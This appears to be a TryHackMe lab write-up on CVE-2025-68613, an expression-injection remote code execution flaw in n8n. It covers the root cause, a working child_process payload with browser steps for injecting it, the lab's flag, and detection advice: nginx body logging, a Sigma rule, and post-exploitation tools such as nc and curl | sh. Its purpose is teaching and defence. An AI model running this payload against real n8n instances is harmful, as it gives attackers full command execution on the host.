# n8n: CVE-2025-68613

Analyzing adversary exploitation techniques for n8n CVE-2025-68613

### Introduction

we are going to examine **CVE-2025-68613**, a **critical vulnerability in n8n** disclosed on **December 19, 2025**, with a **CVSS score of 9.9**.

n8n is an open-source workflow automation platform that enables users to connect applications and services to automate tasks visually. Workflows are composed of **nodes**, where each node represents an action such as making an API request, processing data, or sending notifications.

n8n is widely used to automate repetitive operational tasks and to integrate security tools, internal systems, and SaaS platforms.

---

## Example Workflow

A typical n8n workflow may:

- Schedule an HTTP **GET** request to the **NVD CVE API**
- Format the response using **JavaScript**
- Send the generated report via **email**
- Post the same report to a **Slack channel**

This highlights how deeply n8n can interact with external services and internal logic.

![image.png](image.png)

---

## Common Deployment Models

n8n is commonly deployed in the following configurations:

- **Self-hosted instances**
    
    Deployed on-premises or in private cloud environments for maximum control and data sovereignty.
    
- **Cloud-hosted (n8n.cloud)**
    
    A managed service offering running on shared infrastructure.
    
- **Internal automation platforms**
    
    Deployed within corporate networks to automate workflows between internal and external systems.
    

---

## Vulnerability Details

- **Affected versions:** `0.211.0` through `1.120.3`
- **Vulnerability type:** Remote Code Execution (RCE)
- **Attack vector:** Workflow expression evaluation system
- **Authentication required:** Yes

This vulnerability allows an **authenticated attacker** to execute **arbitrary system-level commands** on the underlying host. Successful exploitation can result in:

- Data breaches
- Service disruption
- Full system compromise

All actions are executed with the privileges of the n8n process, making the impact severe in high-privilege deployments.

---

## What Youâ€™ll Learn

- Technical root cause of CVE-2025-68613
- Browser-based exploitation demonstration
- Detection and monitoring strategies

---

## Remediation

This vulnerability has been fixed in the following versions:

- **1.120.4**
- **1.121.1**
- **1.122.0**

ðŸš¨ **Immediate upgrade to a patched version is strongly recommended** to mitigate the risk of exploitation.

### Technical Background

Before examining the exploit, itâ€™s important to understand **n8nâ€™s internal architecture**.

n8n is built on **Node.js** and uses **JavaScript** for both platform internals and user-defined workflow logic. Its core components include:

- **Workflow Execution Engine**
    
    The core component responsible for orchestrating node-based workflow execution.
    
- **Expression Evaluation System**
    
    Evaluates dynamic expressions wrapped in double curly braces (`{{ }}`) as JavaScript during workflow execution.
    
- **Code Nodes**
    
    Allow users to execute custom JavaScript or Python code as part of a workflow, extending platform functionality.
    
- **400+ Native Integrations**
    
    Pre-built connectors to APIs and services that form the nodes used in workflows.
    

---

## Root Cause of the Vulnerability

The vulnerability resides in **n8nâ€™s workflow expression evaluation system**.

Expressions supplied by authenticated users during workflow configuration are evaluated in an **insecure execution context**. The core issue is an **expression injection flaw** that allows authenticated attackers to execute **arbitrary JavaScript code** with the privileges of the n8n process.

### Key Security Failures

- User input wrapped in `{{ }}` is evaluated as JavaScript **without sufficient sandboxing or validation**
- The expression evaluator lacks **proper context isolation**
- Authentication provides **no meaningful protection**, as any authenticated user can exploit the flaw

---

## Exploitation Payload

Below is a working exploit payload credited to **wioui**:https://github.com/wioui/n8n-CVE-2025-68613-exploit 

```jsx
{{ (function(){returnthis.process.mainModule.require('child_process').execSync('id').toString() })() }}

```

This payload defines and immediately executes an **anonymous function** using the pattern `(function(){ ... })()`.

For clarity, the function body is shown below:

```jsx
function () {
returnthis.process.mainModule
        .require('child_process')
        .execSync('id')
        .toString()
}
```

## Exploit Breakdown

When the anonymous function executes, the `return` statement triggers evaluation of the entire expression. Execution begins with `this`.

### Step-by-Step Escalation

- **`this`**
    
    Refers to the global object in the Node.js execution context.
    
- **`process`**
    
    A Node.js global object that exposes runtime and system-level information.
    
- **`mainModule`**
    
    References the root module of the Node.js application.
    

This sequence allows the attacker to escape the intended expression sandbox and access **Node.js internals**, which should be completely inaccessible to user-defined expressions.

> With proper sandboxing, the expression execution context would be fully isolated from the Node.js runtime environment.
> 

---

## Command Execution

Once `mainModule` is accessible, the payload invokes:

```jsx
.require('child_process')
```

This loads the **child_process** module, a core Node.js module that enables system command execution.

> User expressions should never have access to Node.jsâ€™s module systemâ€”especially dangerous modules like child_process.
> 

From here, command execution becomes trivial:

```jsx
.execSync('id')

```

The `id` command is executed on the host system, returning user and group identity information (UID, GID, groups).

The final call:

```jsx
.toString()

```

Converts the command output from a `Buffer` into a readable string.

---

## Security Boundary Violation

This exploit demonstrates a complete collapse of trust boundaries:

- User expressions escape the intended evaluation sandbox
- Node.js global objects become accessible
- The module system is exposed
- Arbitrary system commands are executed

---

## Context Escalation Chain (Summary)

The full escalation path is as follows:

1. Execution begins inside the expression evaluatorâ€™s intended sandbox
2. Escalation to the Node.js global context via `this`
3. Escalation to module access via `process.mainModule.require`
4. Full system command execution via `child_process`

## Exploitation Walkthrough

Now itâ€™s time to exploit the vulnerability.

We will use a **browser-based â€œfriendlyâ€ proof-of-concept exploit**. For convenience, the payload is provided below:

```jsx
{{ (function(){returnthis.process.mainModule.require('child_process').execSync('id').toString() })() }}
```

---

## Step 1: Create a New Workflow

After logging in to n8n:

- Click **â€œStart from scratchâ€** (if prompted)

![chrome_7MFGgBWhFY.png](chrome_7MFGgBWhFY.png)

- Otherwise, proceed directly to creating a new workflow

---

## Step 2: Add a Manual Trigger

- Click **â€œAdd first stepâ€**

![chrome_68kTS2XSgt.png](chrome_68kTS2XSgt.png)

- Search for and select **Manual Trigger**
- Add it to the workflow

This allows the workflow to be executed on demand.

---

## Step 3: Add an â€œEdit Fields (Set)â€ Node

- Attach a new node to the **Manual Trigger**

![chrome_nYtLi1z0gD.png](chrome_nYtLi1z0gD.png)

- Search for and add **Edit Fields (Set)**

This node allows us to define custom fields and inject the malicious expression.

![chrome_KSrtOgZrpK.png](chrome_KSrtOgZrpK.png)

## Step 4: Inject the Exploit Payload

- Click **â€œAdd Fieldâ€**

![chrome_XvNiB9ZpBT.png](chrome_XvNiB9ZpBT.png)

- Set the field name to something like:
    - `result`
    - `exploit`
- Paste the exploit payload into the **Value** field:

```jsx
{{ (function(){returnthis.process.mainModule.require('child_process').execSync('id').toString() })() }}
```

---

## Step 5: Execute the Workflow

- Click **â€œExecute stepâ€**

![chrome_RNJWDIOyfq.png](chrome_RNJWDIOyfq.png)

- Observe the output returned by the workflow

At this point, the `id` command is executed on the underlying system. The output confirms **remote command execution** with the privileges of the n8n process.

---

## Notes

- As discussed previously, the `id` command can be replaced with **any system command**
- This confirms full RCE capability for any authenticated user
- No additional privileges are required

---

## Challenge Question

**What is the flag?**

![chrome_Izw5EsFHtC.png](chrome_Izw5EsFHtC.png)

`THM{n8n_exposed_workflow}`

## Detection Strategy for CVE-2025-68613 (n8n Expression Injection RCE)

This section focuses on detecting **CVE-2025-68613**, an expression injectionâ€“based **Remote Code Execution (RCE)** vulnerability in n8n, using a **SIEM or other detection platforms**.

---

## Logging Limitations in n8n

Unfortunately, **n8n does not provide sufficiently granular application logs** to reliably detect this attack through native logging alone.

If you want to review what is currently available, refer to the official n8n logging documentation. However, these logs are generally insufficient for detecting malicious expression injection or command execution attempts.

**Bottom line:**

Native n8n logs are not enough. You need visibility elsewhere.

---

## Recommended Detection Approach: Reverse Proxy Logging

The most effective detection method is to place **n8n behind a reverse proxy** (e.g., nginx, Apache, HAProxy) and log **HTTP request bodies**.

With this setup:

- All inbound requests to n8n are inspected
- Request body contents are logged
- Logs are forwarded to your SIEM
- Detection logic focuses on identifying malicious expression payloads

---

## Example: nginx Request Body Logging

Below is an example nginx configuration that logs HTTP request bodies. This allows inspection of workflow payloads containing malicious expressions.

```bash
http {
# Load Lua module
lua_package_path"/etc/nginx/lua/?.lua;;";

# Custom log format
log_format detailed'$remote_addr -$remote_user [$time_local] '
'"$request"$status$body_bytes_sent '
'"$http_referer" "$http_user_agent" '
'Request-Body: "$request_body" '
'Content-Type: "$http_content_type" '
'Duration: $request_time s';

# ... rest of http block ...
}
```

> âš ï¸ Logging request bodies may expose sensitive data. Apply strict access controls and retention policies.
> 

---

## Sigma Rule: Detecting n8n Workflow RCE Attempts

The following **Sigma rule** detects attempts to exploit CVE-2025-68613 by injecting malicious JavaScript expressions into n8n workflow requests.

```yaml
title:N8NWorkflowRCEAttempt
status:experimental
description:DetectsattemptstoinjectJavaScriptexpressionsinton8nworkflowpayloadsthatexecuteOScommandsviathis.process.mainModule.require('child_process').execSync(...)
author:TryHackMeContentEngineeringTeam
references:
-https://github.com/wioui/n8n-CVE-2025-68613-exploit
date:2025-12-23
tags:
-attack.execution
-attack.t1059.007
logsource:
category:webserver
product:generic
detection:
selection:
cs-method:POST
cs-uri-stem|endswith:/rest/workflows

keywords:
# Strong indicators of this n8n expression injection RCE
-"this.process.mainModule.require('child_process')"
-".execSync("
- "={{ (function(){"
    - "toString() })()"

  condition: selection and all of keywords
falsepositives:
  - Security testing / red team simulations
  - Developers storing these exact strings in logged fields
level: high
```

---

## What This Sigma Rule Detects

- Filters **POST** requests sent to `/rest/workflows`
- Scans request bodies for **known exploit strings**
- Flags only requests that match **all exploit indicators**
- Produces **high-confidence alerts**

This minimizes noise while catching real exploitation attempts.

---

## Monitoring Post-Exploitation Activity

Detecting the exploit attempt alone is not enough.

Once exploited, attackers can fully abuse n8n to execute arbitrary system commands. Detection must extend to **post-exploitation behavior**, including:

- **Reverse shell creation**
    
    (e.g., `bash`, `nc`, `curl | sh` executions) https://github.com/SigmaHQ/sigma/blob/master/rules/linux/process_creation/proc_creation_lnx_netcat_reverse_shell.yml
    
- **Malware download and execution**https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_curl_download_direct_ip_exec.yml
    
    (e.g., `wget`, `curl`, `chmod +x`)
    
- **Reconnaissance activity**https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_nltest_recon.yml
    
    (e.g., `id`, `whoami`, `uname -a`, `env`)
    

These actions should be detected using **process creation telemetry** (EDR, auditd, Sysmon, etc.).

---

## Detection Best Practices

- Do **not** rely on a single detection signal
- Correlate:
    - Web proxy detections (exploit attempt)
    - Process execution events (post-exploitation)
- Treat authenticated users as **untrusted**
- Alert on **behavior**, not just payload strings

`Consider  https://tryhackme.com/module/recent-threats for more`